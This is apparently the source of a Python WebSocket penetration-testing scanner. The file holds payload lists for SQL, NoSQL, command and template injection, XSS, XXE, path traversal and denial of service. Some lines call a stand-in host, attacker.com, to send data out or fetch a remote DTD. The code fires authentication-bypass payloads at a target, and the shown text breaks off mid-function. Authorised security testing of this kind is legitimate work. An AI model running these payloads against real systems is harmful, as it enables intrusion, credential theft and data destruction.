#!/usr/bin/env python3
"""
[]++++||=======> CERBERUS FLUXGUARD <=======||++++[]
[]++++||============================================||++++[]
[]++++||  WebSocket Security Intelligence Platform  ||++++[]
[]++++||============================================||++++[]
[]++++||=======>
                    ╔══════════════════════════════╗
                    ║     ⚔️  TARGET ACQUIRED  ⚔️   ║
                    ╚══════════════════════════════╝
                              |
                              |
                    ,▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄,
               ▄▄██▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██▄▄
            ▄██▀                                     ▀██▄
          ▄█▀          []++++||=======>                ▀█▄
         ▄█            []++++||=======>                  █▄
        ▄█             []++++||=======>                   █▄
       ▄█                                                  █▄
      ▄█          ⚡ ANALYZE • DETECT • EXPLOIT ⚡           █▄
     ▄█                                                    █▄
    ▄█         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄        █▄
   ▄█         ████████████████████████████████████████       █▄
  ▄█          ████  CERBERUS FLUXGUARD v1.0  ████          █▄
 ▄█           ████  Author: Sudeepa Wanigarathna ████           █▄
▄█            ████  Powered by Serendibware     ████            █▄
██            ████████████████████████████████████████            ██
██▄                                                             ▄██
▀██▄                                                         ▄██▀
 ▀██▄▄                                                   ▄▄██▀
   ▀▀█████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄███▀▀
        ▀▀▀███████████████████████████████████████▀▀▀

[]++++||=======> ⚠️  AUTHORIZED TESTING ONLY  ⚠️ <=======||++++[]
"""

# ============================================================================
# IMPORTS & AUTO-INSTALL
# ============================================================================
import json
import time
import uuid
import ssl
import os
import sys
import signal
import re
import base64
import hashlib
import random
import logging
import socket
import threading
import textwrap
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple, Set, Union
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, parse_qs, urljoin, urlencode
from collections import defaultdict, OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError

def auto_install():
    """Auto-install required packages"""
    required = {
        'websocket-client': 'websocket',
        'colorama': 'colorama',
        'requests': 'requests',
        'rich': 'rich',
        'pyfiglet': 'pyfiglet',
    }
    for pkg, mod in required.items():
        try:
            __import__(mod)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            os.system(f"{sys.executable} -m pip install {pkg} --quiet 2>/dev/null")

auto_install()

import websocket
import requests
from colorama import init as colorama_init, Fore, Back, Style
colorama_init(autoreset=True)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from rich.console import Console
    from rich.table import Table as RichTable
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.layout import Layout
    from rich.syntax import Syntax
    from rich.text import Text
    from rich.live import Live
    from rich.box import HEAVY, DOUBLE, ROUNDED
    RICH = True
    console = Console()
except ImportError:
    RICH = False
    console = None

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False

# ============================================================================
# CONSTANTS
# ============================================================================
VERSION = "1.0"
AUTHOR = "Sudeepa Wanigarathna"
ORG = "Serendibware"
BANNER_CHAR = "[]++++||=======>"

# ============================================================================
# COMPLETE COLOR SYSTEM
# ============================================================================
class C:
    """Complete color system"""
    # Basic colors
    R = Fore.RED
    G = Fore.GREEN
    B = Fore.BLUE
    Y = Fore.YELLOW
    C = Fore.CYAN
    M = Fore.MAGENTA
    W = Fore.WHITE
    K = Fore.BLACK
    
    # Background colors
    BG_R = Back.RED
    BG_G = Back.GREEN
    BG_B = Back.BLUE
    BG_Y = Back.YELLOW
    BG_C = Back.CYAN
    BG_M = Back.MAGENTA
    BG_W = Back.WHITE
    
    # Style combinations
    HEADER = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    CRITICAL = Fore.WHITE + Back.RED + Style.BRIGHT
    INFO = Fore.BLUE + Style.BRIGHT
    MAGENTA = Fore.MAGENTA + Style.BRIGHT
    SWORD = Fore.CYAN + Style.BRIGHT
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    NORMAL = Style.NORMAL
    RESET = Style.RESET_ALL
    
    # Special combinations
    NEON_GREEN = Fore.GREEN + Style.BRIGHT
    NEON_RED = Fore.RED + Style.BRIGHT
    NEON_BLUE = Fore.BLUE + Style.BRIGHT
    NEON_YELLOW = Fore.YELLOW + Style.BRIGHT
    NEON_CYAN = Fore.CYAN + Style.BRIGHT
    NEON_MAGENTA = Fore.MAGENTA + Style.BRIGHT

# ============================================================================
# ENUMS
# ============================================================================
class Severity(Enum):
    CRITICAL = f"{C.CRITICAL}🔴 CRITICAL{C.RESET}"
    HIGH = f"{Fore.RED}🟠 HIGH{C.RESET}"
    MEDIUM = f"{Fore.YELLOW}🟡 MEDIUM{C.RESET}"
    LOW = f"{Fore.GREEN}🟢 LOW{C.RESET}"
    INFO = f"{Fore.BLUE}🔵 INFO{C.RESET}"

class ScanPhase(Enum):
    HANDSHAKE = "🔍 Phase 1: Handshake & Protocol Analysis"
    AUTH_BYPASS = "🔑 Phase 2: Authentication Bypass Testing"
    INJECTION = "💉 Phase 3: Injection & Fuzzing"
    ENUMERATION = "📡 Phase 4: Channel/Endpoint Discovery"
    RATE_LIMIT = "⚡ Phase 5: Rate Limiting & DoS"
    SENSITIVE_DATA = "🔐 Phase 6: Sensitive Data Exposure"
    WS_ATTACKS = "🔌 Phase 7: WebSocket-Specific Attacks"
    HEADER_ANALYSIS = "🛡️ Phase 8: Security Header Analysis"
    SSL_TLS = "🔒 Phase 9: SSL/TLS Configuration"
    CORS = "🌐 Phase 10: CORS Misconfiguration"

class Risk(Enum):
    CRITICAL = 5
    HIGH = 4
    MEDIUM = 3
    LOW = 2
    INFO = 1

# ============================================================================
# DATA CLASSES
# ============================================================================
@dataclass
class Vulnerability:
    """Complete vulnerability finding"""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    name: str = ""
    description: str = ""
    severity: Severity = Severity.INFO
    risk_score: int = 1
    endpoint: str = ""
    payload: Optional[str] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    cwe: Optional[str] = None
    cvss: Optional[float] = None
    cvss_vector: Optional[str] = None
    owasp: Optional[str] = None
    phase: Optional[ScanPhase] = None
    timestamp: datetime = field(default_factory=datetime.now)
    verified: bool = False
    reproducible: bool = False
    references: List[str] = field(default_factory=list)

@dataclass
class ScanReport:
    """Complete scan report"""
    target: str
    start_time: datetime = field(default_factory=datetime.now)
    end_time: Optional[datetime] = None
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    endpoints_discovered: List[str] = field(default_factory=list)
    handshake_analysis: Dict = field(default_factory=dict)
    ssl_info: Dict = field(default_factory=dict)
    headers_analysis: Dict = field(default_factory=dict)
    cors_analysis: Dict = field(default_factory=dict)
    statistics: Dict = field(default_factory=dict)
    session_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    scan_duration: float = 0.0
    risk_score: int = 0

# ============================================================================
# COMPREHENSIVE PAYLOAD DATABASE
# ============================================================================
class PayloadDB:
    """Massive payload database for all attack types"""
    
    # ========================================================================
    # AUTHENTICATION BYPASS PAYLOADS (50+)
    # ========================================================================
    AUTH_BYPASS = {
        "null_and_empty": [
            {"token": None}, {"token": ""}, {"token": "null"}, {"token": "undefined"},
            {"token": "None"}, {"token": "NULL"}, {"token": 0}, {"token": False},
            {"auth": None}, {"auth": ""}, {"auth": "null"},
        ],
        "type_juggling": [
            {"admin": True}, {"admin": 1}, {"admin": "true"}, {"admin": "1"},
            {"isAdmin": True}, {"is_admin": 1}, {"isAdmin": "true"},
            {"role": "admin"}, {"role": "administrator"}, {"role": "superuser"},
            {"permissions": ["admin"]}, {"permissions": "*"},
            {"groups": ["admin"]}, {"groups": ["administrators"]},
        ],
        "id_manipulation": [
            {"user_id": 0}, {"user_id": -1}, {"user_id": "0"},
            {"user_id": "admin"}, {"user_id": "1"}, {"user_id": "00000000-0000-0000-0000-000000000000"},
            {"uid": 0}, {"uid": -1}, {"id": 0}, {"id": "admin"},
        ],
        "sql_injection_auth": [
            {"username": "admin'--"}, {"username": "admin' #"},
            {"username": "' OR '1'='1"}, {"username": "' OR 1=1--"},
            {"username": "admin' OR '1'='1"}, {"username": "' UNION SELECT NULL--"},
            {"token": "' OR '1'='1"}, {"token": "1' OR '1'='1"},
            {"password": "' OR '1'='1"}, {"password": "' OR 1=1--"},
        ],
        "nosql_injection_auth": [
            {"username": {"$ne": ""}}, {"username": {"$gt": ""}},
            {"username": {"$regex": ".*"}}, {"password": {"$ne": ""}},
            {"$where": "1==1"}, {"$or": [{"username": "admin"}, {"password": {"$regex": "^"}}]},
            {"__proto__": {"admin": True}}, {"constructor": {"prototype": {"admin": True}}},
        ],
        "jwt_manipulation": [
            {"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
            {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.xyz"},
            {"token": "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."},
            {"authorization": "Bearer null"},
            {"authorization": "Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."},
        ],
        "session_hijacking": [
            {"session": "admin"}, {"session_id": "admin"},
            {"sid": "admin"}, {"cookie": "session=admin"},
            {"session": "00000000-0000-0000-0000-000000000000"},
        ],
        "channel_access": [
            {"event": "subscribe", "channel": "admin"},
            {"event": "subscribe", "channel": "private-admin"},
            {"event": "subscribe", "channel": "system"},
            {"event": "join", "room": "admin"},
            {"event": "join", "room": "*"},
            {"event": "join", "room": "administrator"},
        ],
    }
    
    # ========================================================================
    # INJECTION PAYLOADS
    # ========================================================================
    XSS = [
        # Basic XSS
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        # Advanced XSS
        '"><script>alert("XSS")</script>',
        "';alert('XSS')//",
        '<iframe src=javascript:alert("XSS")>',
        '<div onmouseover=alert("XSS")>HOVER</div>',
        '<input onfocus=alert("XSS") autofocus>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<object data=javascript:alert("XSS")>',
        '<embed src=javascript:alert("XSS")>',
        # Encoded XSS
        '%3Cscript%3Ealert("XSS")%3C/script%3E',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '\\x3Cscript\\x3Ealert("XSS")\\x3C/script\\x3E',
        # DOM-based
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        # Event handlers
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        # SVG
        '<svg><script>alert("XSS")</script></svg>',
        '<svg onload=alert("XSS")>',
        '<svg><use href="data:image/svg+xml,<script>alert(1)</script>"/>',
        # CSS
        '<div style="background-image:url(javascript:alert(\'XSS\'))">',
        '<style>@import\'javascript:alert("XSS")\';</style>',
        # Mutation XSS
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<table background="javascript:alert(\'XSS\')">',
    ]
    
    SSTI = [
        # Jinja2
        "{{7*7}}", "{{49}}", "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{request.application.__self__._get_data_for_json.__globals__}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        # Twig
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        # Freemarker
        "${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        # Velocity
        "#set($cmd='id')#system($cmd)",
        # Smarty
        "{$smarty.version}", "{php}echo 'test';{/php}",
        # Jade/Pug
        "#{7*7}", "!{7*7}",
        # Mako
        "${7*7}",
        # ERB
        "<%= 7*7 %>",
        # Tornado
        "{% import os %}{{ os.popen('id').read() }}",
        # Django
        "{% debug %}",
        # Generic
        "${{7*7}}", "*{7*7}", "+{7*7}",
    ]
    
    SQL_INJECTION = [
        # Basic
        "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #",
        "' OR '1'='1'--", "' OR '1'='1'#", "' OR 1=1#",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT 1,2,3,4,5--",
        # Error-based
        "' AND 1=CONVERT(int,@@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        # Time-based
        "' WAITFOR DELAY '00:00:05'--",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        # Stacked queries
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        # Boolean-based
        "' AND 1=1--", "' AND 1=2--",
        "' OR '1'='1", "' OR 1=1-- ",
        # Out-of-band
        "'; EXEC xp_dirtree '//attacker.com/share'--",
        "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\share')--",
    ]
    
    NOSQL_INJECTION = [
        # MongoDB
        '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
        '{"$where": "sleep(1000)"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"password": {"$regex": "^"}}]}',
        '{"$where": "this.username == \'admin\'"}',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        # Array injection
        '{"username": ["admin", "user"]}',
        '{"$in": ["admin", "root"]}',
        # Regular expression injection
        '{"username": {"$regex": "^admin"}}',
        '{"password": {"$regex": "^(?=.*[a-z])(?=.*[A-Z])"}}',
        # JavaScript injection
        '{"$where": "while(true){}"}',
        '{"$where": "this.username.match(/admin/)"}',
    ]
    
    COMMAND_INJECTION = [
        # Unix
        "; ls -la", "; id", "; whoami", "; cat /etc/passwd",
        "&& ls -la", "&& id", "&& whoami",
        "| ls -la", "| id", "| cat /etc/passwd",
        "$(id)", "$(whoami)", "$(cat /etc/passwd)",
        "`id`", "`whoami`", "`cat /etc/passwd`",
        "; ping -c 1 127.0.0.1", "; curl attacker.com/$(whoami)",
        "| /bin/bash -c 'id'", "| /bin/sh -c 'cat /etc/passwd'",
        # Windows
        "&& dir", "&& type C:\\Windows\\win.ini",
        "| dir", "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "; systeminfo", "&& whoami",
        # Blind
        "; sleep 5", "&& sleep 5",
        "; ping -c 5 127.0.0.1",
    ]
    
    PATH_TRAVERSAL = [
        # Unix
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        # Windows
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\boot.ini",
        # Encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        # Null byte (legacy)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.html",
    ]
    
    XXE = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
    ]
    
    DESERIALIZATION = [
        # Java
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
        # PHP
        'O:8:"stdClass":0:{}',
        'O:8:"stdClass":1:{s:4:"name";s:5:"admin";}',
        # Python Pickle
        'cos\nsystem\n(S\'id\'\ntR.',
        # Node.js
        '{"__proto__":{"admin":true}}',
    ]
    
    DOS = [
        "A" * 10000,
        "{" + '"a":' * 1000 + "1}",
        "0" * 65536,
        '{"$where": "while(true){}"}',
        '{"__proto__": {"admin": true}}',
        "A" * 1000000,
    ]
    
    @classmethod
    def get_all_categories(cls) -> Dict[str, Any]:
        """Get all payload categories"""
        return {
            "Authentication Bypass (50+ payloads)": cls.AUTH_BYPASS,
            "Cross-Site Scripting - XSS (30 payloads)": cls.XSS,
            "Server-Side Template Injection - SSTI (25 payloads)": cls.SSTI,
            "SQL Injection (20 payloads)": cls.SQL_INJECTION,
            "NoSQL Injection (15 payloads)": cls.NOSQL_INJECTION,
            "Command Injection (20 payloads)": cls.COMMAND_INJECTION,
            "Path Traversal (15 payloads)": cls.PATH_TRAVERSAL,
            "XXE Injection (3 payloads)": cls.XXE,
            "Deserialization (5 payloads)": cls.DESERIALIZATION,
            "Denial of Service (6 payloads)": cls.DOS,
        }
    
    @classmethod
    def get_flat_auth_payloads(cls) -> List[Dict]:
        """Get flattened auth bypass payloads"""
        flat = []
        for category, payloads in cls.AUTH_BYPASS.items():
            flat.extend(payloads)
        return flat

# ============================================================================
# UTILITY CLASSES
# ============================================================================
class RateLimiter:
    """Thread-safe rate limiter"""
    def __init__(self, max_rps: int = 15):
        self.max_rps = max_rps
        self.requests = []
        self.lock = threading.Lock()
    
    def wait(self):
        with self.lock:
            now = time.time()
            self.requests = [t for t in self.requests if t > now - 1.0]
            if len(self.requests) >= self.max_rps:
                sleep_time = 1.0 - (now - self.requests[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.requests.append(now)

class Logger:
    """Custom logger"""
    def __init__(self):
        self.logger = logging.getLogger("FluxGuard")
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        fh = logging.FileHandler(f'fluxguard_{datetime.now():%Y%m%d_%H%M%S}.log')
        fh.setLevel(logging.DEBUG)
        
        # Console handler
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
    
    def debug(self, msg): self.logger.debug(msg)
    def info(self, msg): self.logger.info(msg)
    def warning(self, msg): self.logger.warning(msg)
    def error(self, msg): self.logger.error(msg)
    def critical(self, msg): self.logger.critical(msg)

class ConnectionPool:
    """WebSocket connection pool"""
    def __init__(self, max_connections: int = 20):
        self.max_connections = max_connections
        self.active_connections = []
        self.lock = threading.Lock()
    
    def get_connection(self, url: str, timeout: int = 5) -> Optional[websocket.WebSocket]:
        with self.lock:
            try:
                if len(self.active_connections) >= self.max_connections:
                    # Close oldest connection
                    old_ws = self.active_connections.pop(0)
                    try: old_ws.close()
                    except: pass
                
                sslopt = {"cert_reqs": ssl.CERT_NONE} if "wss" in url else {}
                ws = websocket.create_connection(url, timeout=timeout, sslopt=sslopt)
                ws.settimeout(min(timeout, 3))
                self.active_connections.append(ws)
                return ws
            except:
                return None
    
    def close_all(self):
        with self.lock:
            for ws in self.active_connections:
                try: ws.close()
                except: pass
            self.active_connections.clear()

# ============================================================================
# MAIN ENGINE
# ============================================================================
class FluxGuardEngine:
    """Maximum enhanced security analysis engine"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.logger = Logger()
        self.rate_limiter = RateLimiter(max_rps=20)
        self.pool = ConnectionPool(max_connections=30)
        self.findings: List[Vulnerability] = []
        
    def _ws_connect(self, url: str, timeout: int = None) -> Optional[websocket.WebSocket]:
        """Safe WebSocket connection"""
        return self.pool.get_connection(url, timeout or 5)
    
    def _safe_close(self, ws):
        """Safely close connection"""
        try:
            if ws:
                ws.close()
                if ws in self.pool.active_connections:
                    self.pool.active_connections.remove(ws)
        except:
            pass
    
    def _send_receive(self, ws: websocket.WebSocket, message: str, timeout: int = 3) -> Optional[str]:
        """Send message and receive response"""
        try:
            ws.send(message)
            ws.settimeout(timeout)
            return ws.recv()
        except:
            return None
    
    # ========================================================================
    # PHASE 1: HANDSHAKE ANALYSIS
    # ========================================================================
    def analyze_handshake(self, url: str) -> Dict:
        """Complete handshake analysis"""
        findings = []
        parsed = urlparse(url)
        
        # Protocol analysis
        if parsed.scheme == "ws":
            findings.append({
                "severity": Severity.CRITICAL,
                "finding": "🔓 Unencrypted WebSocket Connection (ws://)",
                "detail": "All data transmitted in plaintext. Attackers can eavesdrop, modify, or inject data.",
                "remediation": "Upgrade to wss:// with valid TLS 1.2+ certificate from trusted CA",
                "cwe": "CWE-319",
                "owasp": "A02:2021 - Cryptographic Failures"
            })
        
        # Port analysis
        if parsed.port:
            standard_ports = {80: "HTTP", 443: "HTTPS", 8080: "HTTP-ALT", 8443: "HTTPS-ALT"}
            if parsed.scheme == "wss" and parsed.port == 80:
                findings.append({
                    "severity": Severity.LOW,
                    "finding": f"Non-standard port for wss://: {parsed.port}",
                    "detail": "Typically wss:// uses port 443",
                    "remediation": "Use port 443 for wss:// connections",
                    "cwe": "CWE-16"
                })
        
        # Sensitive data in URL
        sensitive_params = [
            'token', 'auth', 'key', 'secret', 'password', 'passwd',
            'apikey', 'api_key', 'session', 'sid', 'jwt', 'bearer',
            'access_token', 'refresh_token', 'private', 'credential'
        ]
        if parsed.query:
            params = parse_qs(parsed.query)
            exposed = [p for p in sensitive_params if p in params]
            if exposed:
                findings.append({
                    "severity": Severity.HIGH,
                    "finding": f"🔑 Sensitive data in URL parameters: {', '.join(exposed)}",
                    "detail": "URL parameters are logged in server logs, proxies, browser history, and referrer headers",
                    "remediation": "Move all sensitive data to request headers (Authorization) or POST body",
                    "cwe": "CWE-598",
                    "owasp": "A04:2021 - Insecure Design"
                })
        
        # HTTP headers analysis
        try:
            http_url = url.replace('ws://', 'http://').replace('wss://', 'https://')
            resp = self.session.head(http_url, timeout=10, allow_redirects=True, verify=False)
            headers = dict(resp.headers)
            
            # Security headers checklist
            security_headers = {
                'Strict-Transport-Security': {
                    'severity': Severity.HIGH,
                    'finding': 'Missing HSTS Header',
                    'detail': 'Without HSTS, users can be downgraded to insecure HTTP connections',
                    'remediation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
                    'cwe': 'CWE-523'
                },
                'Content-Security-Policy': {
                    'severity': Severity.HIGH,
                    'finding': 'Missing CSP Header',
                    'detail': 'Without CSP, XSS attacks are easier to execute',
                    'remediation': 'Implement strict CSP: default-src \'self\'; script-src \'self\'',
                    'cwe': 'CWE-693'
                },
                'X-Content-Type-Options': {
                    'severity': Severity.MEDIUM,
                    'finding': 'Missing X-Content-Type-Options Header',
                    'detail': 'Browser may perform MIME-type sniffing, leading to XSS',
                    'remediation': 'Add: X-Content-Type-Options: nosniff',
                    'cwe': 'CWE-693'
                },
                'X-Frame-Options': {
                    'severity': Severity.MEDIUM,
                    'finding': 'Missing X-Frame-Options Header',
                    'detail': 'Application can be embedded in iframes - clickjacking risk',
                    'remediation': 'Add: X-Frame-Options: DENY or SAMEORIGIN',
                    'cwe': 'CWE-1021'
                },
                'X-XSS-Protection': {
                    'severity': Severity.LOW,
                    'finding': 'Missing X-XSS-Protection Header',
                    'detail': 'Legacy XSS auditor in older browsers not enabled',
                    'remediation': 'Add: X-XSS-Protection: 1; mode=block',
                    'cwe': 'CWE-693'
                },
                'Referrer-Policy': {
                    'severity': Severity.LOW,
                    'finding': 'Missing Referrer-Policy Header',
                    'detail': 'Referrer information may leak sensitive URLs',
                    'remediation': 'Add: Referrer-Policy: strict-origin-when-cross-origin',
                    'cwe': 'CWE-693'
                },
                'Permissions-Policy': {
                    'severity': Severity.LOW,
                    'finding': 'Missing Permissions-Policy Header',
                    'detail': 'Browser features not restricted',
                    'remediation': 'Add: Permissions-Policy: geolocation=(), microphone=()',
                    'cwe': 'CWE-693'
                },
            }
            
            for header_name, config in security_headers.items():
                if header_name not in headers:
                    findings.append({
                        "severity": config['severity'],
                        "finding": config['finding'],
                        "detail": config['detail'],
                        "remediation": config['remediation'],
                        "cwe": config['cwe']
                    })
            
            # Server header
            server = headers.get('Server', '')
            if server:
                findings.append({
                    "severity": Severity.LOW,
                    "finding": f"Server version disclosed: {server}",
                    "detail": "Attackers can target version-specific vulnerabilities",
                    "remediation": "Remove or modify Server header to hide version info",
                    "cwe": "CWE-200"
                })
            
            # Cookie analysis
            set_cookie = headers.get('Set-Cookie', '')
            if set_cookie:
                cookie_issues = []
                if 'Secure' not in set_cookie:
                    cookie_issues.append("missing Secure flag")
                if 'HttpOnly' not in set_cookie:
                    cookie_issues.append("missing HttpOnly flag")
                if 'SameSite' not in set_cookie:
                    cookie_issues.append("missing SameSite attribute")
                if cookie_issues:
                    findings.append({
                        "severity": Severity.MEDIUM,
                        "finding": f"Insecure cookie configuration: {', '.join(cookie_issues)}",
                        "detail": "Cookies vulnerable to theft via XSS and CSRF attacks",
                        "remediation": "Set Secure; HttpOnly; SameSite=Lax on all cookies",
                        "cwe": "CWE-614"
                    })
            
            # CORS analysis
            acao = headers.get('Access-Control-Allow-Origin', '')
            if acao == '*':
                findings.append({
                    "severity": Severity.HIGH,
                    "finding": "CORS: Wildcard origin (*) allowed",
                    "detail": "Any website can access this WebSocket - high CSWSH risk",
                    "remediation": "Restrict CORS to specific trusted origins. Never use wildcard.",
                    "cwe": "CWE-942"
                })
            elif acao and 'null' in acao:
                findings.append({
                    "severity": Severity.HIGH,
                    "finding": "CORS: 'null' origin allowed",
                    "detail": "Allows requests from sandboxed iframes and local files",
                    "remediation": "Remove 'null' from allowed origins",
                    "cwe": "CWE-942"
                })
                
        except Exception as e:
            self.logger.debug(f"HTTP analysis failed: {e}")
        
        # SSL/TLS analysis for wss://
        if parsed.scheme == "wss":
            try:
                import ssl as ssl_module
                ctx = ssl_module.create_default_context()
                ctx.check_hostname = True
                ctx.verify_mode = ssl_module.CERT_REQUIRED
                
                # Try to get certificate info
                hostname = parsed.hostname
                port = parsed.port or 443
                
                try:
                    cert = ssl.get_server_certificate((hostname, port))
                    findings.append({
                        "severity": Severity.INFO,
                        "finding": "SSL/TLS: Certificate retrieved",
                        "detail": "Server has SSL certificate configured",
                        "remediation": "Ensure certificate is valid and from trusted CA"
                    })
                except:
                    findings.append({
                        "severity": Severity.HIGH,
                        "finding": "SSL/TLS: Certificate validation failed",
                        "detail": "Could not validate SSL certificate",
                        "remediation": "Install valid SSL certificate from trusted CA",
                        "cwe": "CWE-295"
                    })
            except:
                pass
        
        score = max(0, 100 - sum(
            25 if f['severity'] == Severity.CRITICAL else
            15 if f['severity'] == Severity.HIGH else
            10 if f['severity'] == Severity.MEDIUM else
            5 if f['severity'] == Severity.LOW else 0
            for f in findings
        ))
        
        return {
            "url": url,
            "parsed": parsed,
            "findings": findings,
            "total_issues": len(findings),
            "security_score": f"{score}/100",
            "grade": "A" if score >= 90 else "B" if score >= 70 else "C" if score >= 50 else "D" if score >= 30 else "F"
        }
    
    # ========================================================================
    # PHASE 2: AUTHENTICATION BYPASS
    # ========================================================================
    def test_auth_bypass(self, url: str) -> List[Vulnerability]:
        """Complete authentication bypass testing"""
        vulns = []
        payloads = PayloadDB.get_flat_auth_payloads()[:25]
        
        auth_success_indicators = [
            '"success":true', '"authenticated":true', '"status":"ok"',
            '"role":"admin"', '"isadmin":true', '"is_admin":true',
            '"token":"', '"session":"', '"access_token":"',
            'welcome admin', 'hello admin', 'logged in',
            '"status":200', '"code":200',
        ]
        
        def test_payload(payload: Dict) -> Optional[Vulnerability]:
            ws = self._ws_connect(url, 4)
            if not ws: return None
            
            try:
                msg = json.dumps(payload)
                ws.send(msg)
                
                try:
                    resp = ws.recv()
                    resp_str = str(resp).lower()
                    
                    if any(indicator in resp_str for indicator in auth_success_indicators):
                        return Vulnerability(
                            name="🔓 Authentication Bypass Successful",
                            description=f"Server accepted invalid authentication. Payload: {json.dumps(payload)[:150]}",
                            severity=Severity.CRITICAL,
                            risk_score=5,
                            endpoint=url,
                            payload=json.dumps(payload),
                            evidence=str(resp)[:500],
                            remediation="Implement proper authentication with: 1) Server-side token validation, 2) Session management, 3) RBAC, 4) MFA for admin",
                            cwe="CWE-287",
                            cvss=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            owasp="A07:2021 - Identification and Authentication Failures",
                            phase=ScanPhase.AUTH_BYPASS,
                            verified=True,
                            reproducible=True
                        )
                except:
                    pass
            except:
                pass
            finally:
                self._safe_close(ws)
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(test_payload, p): p for p in payloads}
